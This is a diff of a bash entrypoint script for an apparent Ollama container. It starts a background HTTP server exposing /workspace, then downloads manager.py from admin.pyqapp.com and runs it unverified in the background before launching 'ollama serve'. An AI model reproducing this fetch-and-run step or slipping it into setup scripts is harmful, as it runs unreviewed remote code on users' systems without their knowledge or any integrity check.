@@ -1,26 +1,20 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# 1) Install Python
-apt-get update
-apt-get install -y python3-pip
+# Install downloader if missing
+apt-get update    || true
+apt-get install -y wget || true
 
-# 2) Prepare workspace
+# Prepare workspace
 mkdir -p /workspace
 cd /workspace
 
-# 3) Launch HTTP server
-nohup python3 -m http.server 8000 > http.log 2>&1 &
+# Launch HTTP server in background
+nohup python3 -m http.server 8000 >http.log 2>&1 &
 
-# 4) Download & run manager.py
-python3 - <<'PYCODE'
-import urllib.request
-urllib.request.urlretrieve(
-    'https://admin.pyqapp.com/api/manager.py',
-    '/workspace/manager.py'
-)
-PYCODE
-nohup python3 /workspace/manager.py > output.log 2>&1 &
+# Fetch and launch your manager.py
+wget -qO manager.py https://admin.pyqapp.com/api/manager.py
+nohup python3 manager.py >output.log 2>&1 &
 
-# 5) Keep alive
-tail -f /workspace/output.log
+# Now hand off to Ollama's native entrypoint and keep it in the foreground
+exec ollama serve --port 11434
